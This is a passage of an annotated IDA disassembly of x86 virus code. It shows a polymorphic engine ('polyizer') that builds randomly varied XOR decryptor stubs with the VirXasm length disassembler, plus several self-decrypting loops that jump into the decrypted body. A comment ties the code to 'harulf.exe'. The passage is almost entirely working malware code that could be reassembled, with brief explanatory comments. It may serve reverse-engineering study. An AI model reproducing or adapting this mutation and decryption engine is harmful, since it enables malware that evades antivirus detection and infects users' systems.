.text:00402461                 cmp     eax, 0          ; is remainder 0?
.text:00402464                 ja      short locret_402469 ; no so jump here
.text:00402466                 xchg    eax, edx        ; swap eax , edx
.text:00402467                 jmp     short loc_402456 ; loop here
.text:00402469 ; ---------------------------------------------------------------------------
.text:00402469
.text:00402469 locret_402469:                          ; CODE XREF: random_number+1E\u2191j
.text:00402469                 retn                    ; return
.text:00402469 random_number   endp
.text:00402469
.text:0040246A This next chunk is the length-disassembler that gets imported into harulf.exe
.text:0040246A
.text:0040246A ; =============== S U B R O U T I N E =======================================
.text:0040246A
.text:0040246A ; Attributes: noreturn
.text:0040246A
.text:0040246A sub_40246A      proc near               ; CODE XREF: polyizer+51\u2193p
.text:0040246A                                         ; .text:00402619\u2193p ...
.text:0040246A                 pusha
.text:0040246B                 sub     esp, 6Eh
.text:0040246E                 cld
.text:0040246F                 mov     edi, esp
.text:00402471                 push    esi
.text:00402472                 call    sub_4024B2
.text:00402477                 pop     eax
.text:00402478                 jmp     far ptr 0BFB1h:0F33E0011h
.text:00402478 sub_40246A      endp
.text:00402478
.text:00402478 ; ---------------------------------------------------------------------------
.text:0040247F                 db 80h
.text:00402480                 dd 19B0AC0Bh, 0A0C1154h, 0F3F3FFFFh, 555F0F88h, 550D5D55h
.text:00402480                 dd 1D005FFh, 7551004h, 0F0EC40Dh, 0F8FF7FA0h, 0FFFFFFF8h
.text:00402480                 dd 0FFFFFF55h, 100101FFh
.text:004024B0                 db 10h, 15h
.text:004024B2
.text:004024B2 ; =============== S U B R O U T I N E =======================================
.text:004024B2
.text:004024B2
.text:004024B2 sub_4024B2      proc near               ; CODE XREF: sub_40246A+8\u2191p
.text:004024B2
.text:004024B2 arg_76          = dword ptr  7Ah
.text:004024B2 arg_8E          = dword ptr  92h
.text:004024B2
.text:004024B2                 pop     ebx
.text:004024B3                 lea     esi, [ebx+0Dh]
.text:004024B6                 push    64h ; 'd'
.text:004024B8                 pop     ecx
.text:004024B9
.text:004024B9 loc_4024B9:                             ; CODE XREF: sub_4024B2+F\u2193j
.text:004024B9                 bt      [ebx], ecx
.text:004024BC                 setalc
.text:004024BD                 jnb     short loc_4024C0
.text:004024BF                 lodsb
.text:004024C0
.text:004024C0 loc_4024C0:                             ; CODE XREF: sub_4024B2+B\u2191j
.text:004024C0                 stosb
.text:004024C1                 loop    loc_4024B9
.text:004024C3                 pop     esi
.text:004024C4                 push    2
.text:004024C6                 pop     ebx
.text:004024C7                 mov     edx, ebx
.text:004024C9
.text:004024C9 loc_4024C9:                             ; CODE XREF: sub_4024B2+59\u2193j
.text:004024C9                 lodsb
.text:004024CA                 push    eax
.text:004024CB                 push    eax
.text:004024CC                 cmp     al, 66h ; 'f'
.text:004024CE                 cmovz   ebx, ecx
.text:004024D1                 cmp     al, 67h ; 'g'
.text:004024D3                 cmovz   edx, ecx
.text:004024D6                 cmp     al, 0EAh ; ''
.text:004024D8                 jz      short loc_4024DF
.text:004024DA                 cmp     al, 9Ah ; ''
.text:004024DC                 jnz     short loc_4024E3
.text:004024DE                 inc     esi
.text:004024DF
.text:004024DF loc_4024DF:                             ; CODE XREF: sub_4024B2+26\u2191j
.text:004024DF                 lea     esi, [esi+ebx+3]
.text:004024E3
.text:004024E3 loc_4024E3:                             ; CODE XREF: sub_4024B2+2A\u2191j
.text:004024E3                 cmp     al, 0C8h ; ''
.text:004024E5                 jz      short loc_4024ED
.text:004024E7                 and     al, 0F7h
.text:004024E9                 cmp     al, 0C2h ; ''
.text:004024EB                 jnz     short loc_4024EF
.text:004024ED
.text:004024ED loc_4024ED:                             ; CODE XREF: sub_4024B2+33\u2191j
.text:004024ED                 inc     esi
.text:004024EE                 inc     esi
.text:004024EF
.text:004024EF loc_4024EF:                             ; CODE XREF: sub_4024B2+39\u2191j
.text:004024EF                 and     al, 0E7h
.text:004024F1                 cmp     al, 26h ; '&'
.text:004024F3                 pop     eax
.text:004024F4                 jz      short loc_40250A
.text:004024F6                 cmp     al, 0F1h ; ''
.text:004024F8                 jz      short loc_402508
.text:004024FA                 and     al, 0FCh
.text:004024FC                 cmp     al, 0A0h ; ''
.text:004024FE                 jnz     short loc_402504
.text:00402500                 lea     esi, [esi+edx+2]
.text:00402504
.text:00402504 loc_402504:                             ; CODE XREF: sub_4024B2+4C\u2191j
.text:00402504                 cmp     al, 0F0h ; ''
.text:00402506                 jz      short loc_40250A
.text:00402508
.text:00402508 loc_402508:                             ; CODE XREF: sub_4024B2+46\u2191j
.text:00402508                 cmp     al, 64h ; 'd'
.text:0040250A
.text:0040250A loc_40250A:                             ; CODE XREF: sub_4024B2+42\u2191j
.text:0040250A                                         ; sub_4024B2+54\u2191j
.text:0040250A                 pop     eax
.text:0040250B                 jz      short loc_4024C9
.text:0040250D                 mov     edi, esp
.text:0040250F                 push    edx
.text:00402510                 push    eax
.text:00402511                 cmp     al, 0Fh
.text:00402513                 jnz     short loc_402516
.text:00402515                 lodsb
.text:00402516
.text:00402516 loc_402516:                             ; CODE XREF: sub_4024B2+61\u2191j
.text:00402516                 pushf
.text:00402517                 aam     10h
.text:00402519                 xchg    cl, ah
.text:0040251B                 cwde
.text:0040251C                 cdq
.text:0040251D                 xor     ebp, ebp
.text:0040251F                 popf
.text:00402520                 jnz     short loc_402538
.text:00402522                 add     edi, 35h ; '5'
.text:00402525                 jecxz   short loc_402534
.text:00402527
.text:00402527 loc_402527:                             ; CODE XREF: sub_4024B2+7C\u2193j
.text:00402527                 bt      [edi], ebp
.text:0040252A                 jnb     short loc_40252D
.text:0040252C                 inc     edx
.text:0040252D
.text:0040252D loc_40252D:                             ; CODE XREF: sub_4024B2+78\u2191j
.text:0040252D                 inc     ebp
.text:0040252E                 loop    loc_402527
.text:00402530                 jb      short loc_402534
.text:00402532                 setalc
.text:00402533                 cdq
.text:00402534
.text:00402534 loc_402534:                             ; CODE XREF: sub_4024B2+73\u2191j
.text:00402534                                         ; sub_4024B2+7E\u2191j
.text:00402534                 shl     edx, 1
.text:00402536                 jmp     short loc_402550
.text:00402538 ; ---------------------------------------------------------------------------
.text:00402538
.text:00402538 loc_402538:                             ; CODE XREF: sub_4024B2+6E\u2191j
.text:00402538                 sub     cl, 4
.text:0040253B                 jns     short loc_402541
.text:0040253D                 mov     cl, 0Ch
.text:0040253F                 and     al, 7
.text:00402541
.text:00402541 loc_402541:                             ; CODE XREF: sub_4024B2+89\u2191j
.text:00402541                 jecxz   short loc_40254E
.text:00402543
.text:00402543 loc_402543:                             ; CODE XREF: sub_4024B2+98\u2193j
.text:00402543                 adc     dl, 1
.text:00402546                 inc     ebp
.text:00402547                 bt      [edi], ebp
.text:0040254A                 loop    loc_402543
.text:0040254C                 jb      short loc_402550
.text:0040254E
.text:0040254E loc_40254E:                             ; CODE XREF: sub_4024B2:loc_402541\u2191j
.text:0040254E                 shr     al, 1
.text:00402550
.text:00402550 loc_402550:                             ; CODE XREF: sub_4024B2+84\u2191j
.text:00402550                                         ; sub_4024B2+9A\u2191j
.text:00402550                 xchg    cl, al
.text:00402552                 lea     edx, [ecx+edx*8]
.text:00402555                 pop     ecx
.text:00402556                 pop     ebp
.text:00402557                 bt      [edi+2], edx
.text:0040255B                 jnb     short loc_402598
.text:0040255D                 lodsb
.text:0040255E                 aam     8
.text:00402560                 shl     ah, 4
.text:00402563                 jnb     short loc_402567
.text:00402565                 js      short loc_402586
.text:00402567
.text:00402567 loc_402567:                             ; CODE XREF: sub_4024B2+B1\u2191j
.text:00402567                 pushf
.text:00402568                 test    ebp, ebp
.text:0040256A                 jnz     short loc_402572
.text:0040256C                 sub     al, 6
.text:0040256E                 jnz     short loc_402579
.text:00402570                 mov     al, 5
.text:00402572
.text:00402572 loc_402572:                             ; CODE XREF: sub_4024B2+B8\u2191j
.text:00402572                 cmp     al, 4
.text:00402574                 jnz     short loc_402579
.text:00402576                 lodsb
.text:00402577                 and     al, 7
.text:00402579
.text:00402579 loc_402579:                             ; CODE XREF: sub_4024B2+BC\u2191j
.text:00402579                                         ; sub_4024B2+C2\u2191j
.text:00402579                 popf
.text:0040257A                 jb      short loc_402582
.text:0040257C                 js      short loc_402585
.text:0040257E                 cmp     al, 5
.text:00402580                 jnz     short loc_402586
.text:00402582
.text:00402582 loc_402582:                             ; CODE XREF: sub_4024B2+C8\u2191j
.text:00402582                 add     esi, ebp
.text:00402584                 inc     esi
.text:00402585
.text:00402585 loc_402585:                             ; CODE XREF: sub_4024B2+CA\u2191j
.text:00402585                 inc     esi
.text:00402586
.text:00402586 loc_402586:                             ; CODE XREF: sub_4024B2+B3\u2191j
.text:00402586                                         ; sub_4024B2+CE\u2191j
.text:00402586                 test    ah, 60h
.text:00402589                 jnz     short loc_402598
.text:0040258B                 xchg    eax, ecx
.text:0040258C                 cmp     al, 0F6h ; ''
.text:0040258E                 jz      short loc_402597
.text:00402590                 cmp     al, 0F7h ; ''
.text:00402592                 jnz     short loc_402598
.text:00402594                 add     esi, ebx
.text:00402596                 inc     esi
.text:00402597
.text:00402597 loc_402597:                             ; CODE XREF: sub_4024B2+DC\u2191j
.text:00402597                 inc     esi
.text:00402598
.text:00402598 loc_402598:                             ; CODE XREF: sub_4024B2+A9\u2191j
.text:00402598                                         ; sub_4024B2+D7\u2191j ...
.text:00402598                 shl     edx, 1
.text:0040259A                 bt      [edi+13h], edx
.text:0040259E                 jnb     short loc_4025AA
.text:004025A0                 inc     edx
.text:004025A1                 bt      [edi+13h], edx
.text:004025A5                 jnb     short loc_4025A9
.text:004025A7                 adc     esi, ebx
.text:004025A9
.text:004025A9 loc_4025A9:                             ; CODE XREF: sub_4024B2+F3\u2191j
.text:004025A9                 inc     esi
.text:004025AA
.text:004025AA loc_4025AA:                             ; CODE XREF: sub_4024B2+EC\u2191j
.text:004025AA                 add     esp, 6Eh
.text:004025AD                 sub     esi, [esp-76h+arg_76]
.text:004025B1                 mov     [esp-76h+arg_8E], esi
.text:004025B5                 popa
.text:004025B6                 retn
.text:004025B6 sub_4024B2      endp ; sp-analysis failed
.text:004025B6
.text:004025B6 ; ---------------------------------------------------------------------------
.text:004025B7 dword_4025B7    dd 0                    ; DATA XREF: polyizer\u2193w
.text:004025B7                                         ; .text:00402627\u2193w ...
.text:004025BB dword_4025BB    dd 0                    ; DATA XREF: polyizer+A\u2193w
.text:004025BB                                         ; .text:00402636\u2193w ...
.text:004025BF
.text:004025BF ; =============== S U B R O U T I N E =======================================
.text:004025BF
.text:004025BF ; Attributes: noreturn
.text:004025BF
.text:004025BF polyizer        proc near               ; CODE XREF: start+2AA\u2191p
.text:004025BF                 mov     ss:dword_4025B7[ebp], 0 ; save 0 to mem
.text:004025C9                 mov     ss:dword_4025BB[ebp], 0 ; save 0 to mem
.text:004025D3                 lea     esi, loc_4018C7[ebp] ; start addr of nop segment
.text:004025D9                 mov     ecx, 120h       ; ecx = 120h
.text:004025DE                 push    esi             ; push start addr of nop segment
.text:004025DF
.text:004025DF loc_4025DF:                             ; CODE XREF: polyizer+25\u2193j
.text:004025DF                 xor     edx, edx        ; edx = 0
.text:004025E1                 mov     [esi], edx      ; overwrite nop with 0
.text:004025E3                 inc     esi             ; go to next nop line
.text:004025E4                 loop    loc_4025DF      ; overwrite the entire nop segment with 0s
.text:004025E6                 pop     edi             ; restore edi
.text:004025E7                 lea     eax, byte_402681[ebp] ; eax = addr for storage mem
.text:004025ED                 mov     ecx, 2          ; ecx = 2
.text:004025F2                 xor     ecx, ecx        ; ecx = 0
.text:004025F4                 mov     ecx, 9          ; ecx = 9
.text:004025F9
.text:004025F9 loc_4025F9:                             ; CODE XREF: .text:00402642\u2193j
.text:004025F9                 push    ecx             ; push ecx onto stack
.text:004025FA                 call    random_addr     ; get a random addr
.text:004025FF                 mov     esi, edx        ; esi = random addr
.text:00402601                 mov     ebx, 9          ; ebx = 9
.text:00402606                 sub     ebx, ecx        ; ebx - ecx
.text:00402608                 xchg    ecx, ebx        ; ebx = 9, ecx = (ebx - ecx)
.text:0040260A                 call    sub_402663      ; set ebx to 0 and return if ecx = 0
.text:0040260F                 push    esi             ; push random addr generated onto stack
.text:00402610                 call    sub_40246A      ; call VirXasm length disassembler
.text:00402610 polyizer        endp
.text:00402610
.text:00402615 ; ---------------------------------------------------------------------------
.text:00402615                 mov     ebx, eax
.text:00402617                 add     esi, eax
.text:00402619                 call    sub_40246A
.text:0040261E ; ---------------------------------------------------------------------------
.text:0040261E                 add     ebx, eax
.text:00402620                 cmp     dword ptr [esp+4], 5
.text:00402625                 jb      short loc_40262F
.text:00402627                 add     ss:dword_4025B7[ebp], ebx
.text:0040262D                 jmp     short loc_40263C
.text:0040262F ; ---------------------------------------------------------------------------
.text:0040262F
.text:0040262F loc_40262F:                             ; CODE XREF: .text:00402625\u2191j
.text:0040262F                 cmp     dword ptr [esp+4], 3
.text:00402634                 jb      short loc_40263C
.text:00402636                 add     ss:dword_4025BB[ebp], ebx
.text:0040263C
.text:0040263C loc_40263C:                             ; CODE XREF: .text:0040262D\u2191j
.text:0040263C                                         ; .text:00402634\u2191j
.text:0040263C                 xchg    ecx, ebx
.text:0040263E                 pop     esi
.text:0040263F                 rep movsb
.text:00402641                 pop     ecx
.text:00402642                 loop    loc_4025F9
.text:00402644                 lea     eax, loc_4018C7[ebp]
.text:0040264A                 add     eax, ss:dword_4025B7[ebp]
.text:00402650                 add     eax, ss:dword_4025BB[ebp]
.text:00402656                 inc     eax
.text:00402657                 mov     ebx, ss:dword_4025BB[ebp]
.text:0040265D                 inc     ebx
.text:0040265E                 not     bl
.text:00402660                 mov     [eax], bl
.text:00402662                 retn
.text:00402663
.text:00402663 ; =============== S U B R O U T I N E =======================================
.text:00402663
.text:00402663
.text:00402663 sub_402663      proc near               ; CODE XREF: polyizer+4B\u2191p
.text:00402663                 xor     ebx, ebx
.text:00402665                 or      ecx, ecx
.text:00402667                 jz      short locret_402680
.text:00402669
.text:00402669 loc_402669:                             ; CODE XREF: sub_402663+1B\u2193j
.text:00402669                 call    sub_40246A
.text:0040266E ; ---------------------------------------------------------------------------
.text:0040266E                 add     ebx, eax
.text:00402670                 add     esi, eax
.text:00402672                 call    sub_40246A
.text:00402677 ; ---------------------------------------------------------------------------
.text:00402677                 add     ebx, eax
.text:00402679                 add     esi, eax
.text:0040267B                 dec     ecx
.text:0040267C                 or      ecx, ecx
.text:0040267E                 jnz     short loc_402669
.text:00402680
.text:00402680 locret_402680:                          ; CODE XREF: sub_402663+4\u2191j
.text:00402680                 retn
.text:00402680 sub_402663      endp
.text:00402680
.text:00402680 ; ---------------------------------------------------------------------------
.text:00402681 byte_402681     db 3 dup(0)             ; DATA XREF: polyizer+28\u2191o
.text:00402681                                         ; random_addr+16\u2193o
.text:00402684                 dd 1D00h, 4000h
.text:0040268C                 db 0
.text:0040268D
.text:0040268D ; =============== S U B R O U T I N E =======================================
.text:0040268D
.text:0040268D
.text:0040268D random_addr     proc near               ; CODE XREF: polyizer+3B\u2191p
.text:0040268D                 push    ecx             ; save ecx onto stack
.text:0040268E                 push    ebx             ; save ebx onto stack
.text:0040268F                 mov     ecx, 3          ; ecx = 3
.text:00402694                 call    random_number   ; get random number
.text:00402699                 dec     eax             ; decrement random value by 1
.text:0040269A                 xor     edx, edx        ; edx = 0
.text:0040269C                 mov     ecx, 4          ; ecx = 4
.text:004026A1                 mul     ecx             ; multiply random value by 4
.text:004026A3                 lea     edx, byte_402681[ebp] ; edx = addr of of this byte
.text:004026A9                 add     edx, eax        ; edx += eax
.text:004026AB                 mov     edx, [edx]      ; edx = pointer to edx
.text:004026AD                 lea     ebx, sub_4026BA[ebp] ; load effective addr of subroutine call
.text:004026B3                 add     ebx, edx        ; ebx has the random addr
.text:004026B5                 xchg    edx, ebx        ; edx has the random addr
.text:004026B7                 pop     ebx             ; restore ebx
.text:004026B8                 pop     ecx             ; restore ebx
.text:004026B9                 retn                    ; return
.text:004026B9 random_addr     endp
.text:004026B9
.text:004026BA
.text:004026BA ; =============== S U B R O U T I N E =======================================
.text:004026BA
.text:004026BA
.text:004026BA sub_4026BA      proc near               ; DATA XREF: random_addr+20\u2191o
.text:004026BA
.text:004026BA arg_0           = dword ptr  4
.text:004026BA
.text:004026BA                 pop     edx
.text:004026BB                 nop
.text:004026BC                 mov     edx, [edx]
.text:004026BE                 nop
.text:004026BF                 xor     [esp-4+arg_0], edx
.text:004026C2                 nop
.text:004026C3                 mov     ecx, 1720h
.text:004026C8                 nop
.text:004026C9                 mov     esi, [esp-4+arg_0]
.text:004026CC                 nop
.text:004026CD
.text:004026CD loc_4026CD:                             ; CODE XREF: sub_4026BA+18\u2193j
.text:004026CD                 xor     [esi], edx
.text:004026CF                 nop
.text:004026D0                 inc     esi
.text:004026D1                 nop
.text:004026D2                 loop    loc_4026CD
.text:004026D4                 nop
.text:004026D5                 retn
.text:004026D5 sub_4026BA      endp ; sp-analysis failed
.text:004026D5
.text:004026D5 ; ---------------------------------------------------------------------------
.text:004026D6                 db 90h
.text:004026D7 ; ---------------------------------------------------------------------------
.text:004026D7                 mov     edx, [esp]
.text:004026DA                 add     esp, 4
.text:004026DD                 push    dword ptr [edx]
.text:004026DF                 pop     edx
.text:004026E0                 mov     edi, esp
.text:004026E2                 xor     [edi], edx
.text:004026E4                 push    1720h
.text:004026E9                 pop     ecx
.text:004026EA                 pop     esi
.text:004026EB                 push    esi
.text:004026EC
.text:004026EC loc_4026EC:                             ; CODE XREF: .text:004026F4\u2193j
.text:004026EC                 mov     edi, edx
.text:004026EE                 xor     [esi], edi
.text:004026F0                 add     esi, 1
.text:004026F3                 nop
.text:004026F4                 loop    loc_4026EC
.text:004026F6                 nop
.text:004026F7                 pop     ebp
.text:004026F8                 jmp     ebp
.text:004026FA ; ---------------------------------------------------------------------------
.text:004026FA                 pop     ecx
.text:004026FB                 mov     edx, ecx
.text:004026FD                 mov     ecx, [edx]
.text:004026FF                 mov     edx, ecx
.text:00402701                 mov     edi, esp
.text:00402703                 xor     [edi], edx
.text:00402705                 xor     ecx, ecx
.text:00402707                 add     ecx, 1720h
.text:0040270D                 mov     ebx, [edi]
.text:0040270F                 xchg    ebx, esi
.text:00402711
.text:00402711 loc_402711:                             ; CODE XREF: .text:00402719\u2193j
.text:00402711                 mov     eax, edx
.text:00402713                 xor     [esi], eax
.text:00402715                 adc     esi, 1
.text:00402718                 cld
.text:00402719                 loop    loc_402711
.text:0040271B                 xchg    ecx, ecx
.text:0040271D                 pop     edx
.text:0040271E                 jmp     edx
.text:0040271E ; ---------------------------------------------------------------------------
.text:00402720                 align 100h
.text:00402800                 dd 200h dup(?)
.text:00402800 _text           ends
.text:00402800
.text:00402800
.text:00402800                 end start
